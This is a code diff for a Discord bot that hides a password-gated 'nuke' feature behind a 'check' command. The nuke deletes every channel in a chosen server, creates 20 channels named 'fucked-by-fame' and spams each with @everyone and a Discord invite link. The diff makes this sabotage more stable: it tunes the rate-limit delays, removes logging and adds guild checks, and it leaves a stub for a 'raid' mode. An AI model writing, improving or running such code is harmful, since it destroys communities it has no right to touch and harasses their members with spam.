@@ -78,7 +78,7 @@ client.on('interactionCreate', async interaction => {
 
     if (action !== 'check') return;
 
-    // Start Button
+    // 1. Start Button → Password
     if (interaction.isButton() && interaction.customId.startsWith('check_start_')) {
       const modal = new ModalBuilder()
         .setCustomId(`check_modal_${interaction.user.id}`)
@@ -89,7 +89,7 @@ client.on('interactionCreate', async interaction => {
       return await interaction.showModal(modal);
     }
 
-    // Password
+    // 2. Password Modal
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== MAIN_PASSWORD) {
@@ -117,11 +117,14 @@ client.on('interactionCreate', async interaction => {
       userSessions.set(interaction.user.id, {});
     }
 
-    // Server Select
+    // 3. Server Select
     if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_server_select_')) {
       await interaction.deferUpdate();
+
       const guildId = interaction.values[0];
       const guild = client.guilds.cache.get(guildId);
+      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
+
       userSessions.set(interaction.user.id, { guildId });
 
       const actionSelect = new StringSelectMenuBuilder()
@@ -133,26 +136,40 @@ client.on('interactionCreate', async interaction => {
         ]);
 
       await interaction.editReply({
-        content: `**Selected:** ${guild ? guild.name : 'Unknown'}\nChoose action:`,
+        content: `**Selected:** ${guild.name}\nChoose action:`,
         components: [new ActionRowBuilder().addComponents(actionSelect)]
       });
     }
 
-    // Action Select
+    // 4. Action Select (Fixed - No defer when showing modal)
     if (interaction.isStringSelectMenu() && interaction.customId.startsWith('check_action_select_')) {
-      await interaction.deferUpdate();
-      if (interaction.values[0] === 'nuke') {
+      const choice = interaction.values[0];
+      const session = userSessions.get(interaction.user.id);
+
+      if (choice === 'nuke') {
         const modal = new ModalBuilder()
           .setCustomId(`check_nuke_modal_${interaction.user.id}`)
           .setTitle('Confirm Nuke');
+
         modal.addComponents(new ActionRowBuilder().addComponents(
-          new TextInputBuilder().setCustomId('password').setLabel('Nuke Password').setStyle(TextInputStyle.Short).setRequired(true)
+          new TextInputBuilder()
+            .setCustomId('password')
+            .setLabel('Nuke Password')
+            .setStyle(TextInputStyle.Short)
+            .setRequired(true)
         ));
+
         return await interaction.showModal(modal);
+      }
+
+      // For Raid (if you want to keep it)
+      if (choice === 'raid') {
+        await interaction.deferUpdate();
+        // Raid logic here if needed
       }
     }
 
-    // ==================== NUKE - FIXED & IMPROVED ====================
+    // ==================== NUKE (Stable) ====================
     if (interaction.isModalSubmit() && interaction.customId.startsWith('check_nuke_modal_')) {
       const password = interaction.fields.getTextInputValue('password');
       if (password !== NUKE_PASSWORD) {
@@ -163,30 +180,25 @@ client.on('interactionCreate', async interaction => {
 
       const session = userSessions.get(interaction.user.id);
       const guild = client.guilds.cache.get(session?.guildId);
-
-      if (!guild) {
-        return interaction.editReply({ content: '❌ Server not found or session expired.' });
-      }
+      if (!guild) return interaction.editReply({ content: '❌ Server not found.' });
 
       await interaction.editReply({ content: `☢️ Starting nuke on **${guild.name}**...` });
 
       const delay = ms => new Promise(r => setTimeout(r, ms));
 
       try {
-        console.log(`[NUKE] Starting on ${guild.name} (${guild.id})`);
-
-        // Delete channels
+        // Delete
         await interaction.followUp({ content: '🗑️ Deleting all channels...', flags: MessageFlags.Ephemeral });
-        for (const channel of guild.channels.cache.values()) {
-          await channel.delete().catch(() => {});
-          await delay(350);
+        for (const ch of guild.channels.cache.values()) {
+          await ch.delete().catch(() => {});
+          await delay(400);
         }
 
-        // Create channels
+        // Create
         await interaction.followUp({ content: '🔨 Creating fucked-by-fame channels...', flags: MessageFlags.Ephemeral });
         const created = [];
 
-        for (let i = 0; i < 20; i++) { // 20 channels - very safe
+        for (let i = 0; i < 20; i++) {
           try {
             const chan = await guild.channels.create({
               name: 'fucked-by-fame',
@@ -194,36 +206,30 @@ client.on('interactionCreate', async interaction => {
               reason: 'Nuke by Fame'
             });
             created.push(chan);
-            console.log(`[NUKE] Created channel: ${chan.name}`);
-            await delay(1300); // Slow to avoid rate limit
-          } catch (e) {
-            console.error("[NUKE] Channel creation failed:", e.message);
-            break;
-          }
+            await delay(1300);
+          } catch (e) { break; }
         }
 
         // Spam
-        await interaction.followUp({ content: `💥 Spamming @everyone + invite in ${created.length} channels...`, flags: MessageFlags.Ephemeral });
+        await interaction.followUp({ content: `💥 Spamming @everyone + invite...`, flags: MessageFlags.Ephemeral });
         const invite = 'https://discord.gg/NANQMy3WnD';
-        const spamText = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
+        const spam = `@everyone fucked by veynetta ${invite}\n**FAME REAL FAME**`;
 
-        for (const channel of created) {
-          for (let i = 0; i < 12; i++) {
-            channel.send(spamText).catch(() => {});
+        for (const ch of created) {
+          for (let i = 0; i < 10; i++) {
+            ch.send(spam).catch(() => {});
             if (i % 3 === 0) await delay(500);
           }
         }
 
         await interaction.followUp({ 
-          content: `✅ **NUKE COMPLETE**\nCreated **${created.length}** channels named \`fucked-by-fame\`\nSpamming @everyone + invite link`,
+          content: `✅ **NUKE COMPLETE**\nCreated **${created.length}** \`fucked-by-fame\` channels`,
           flags: MessageFlags.Ephemeral 
         });
 
-        console.log(`[NUKE] Finished on ${guild.name} - ${created.length} channels created`);
-
       } catch (err) {
-        console.error('[NUKE ERROR]', err);
-        await interaction.followUp({ content: '⚠️ Nuke failed. Check bot permissions.', flags: MessageFlags.Ephemeral });
+        console.error(err);
+        await interaction.followUp({ content: '⚠️ Nuke partially failed.', flags: MessageFlags.Ephemeral });
       }
 
       userSessions.delete(interaction.user.id);
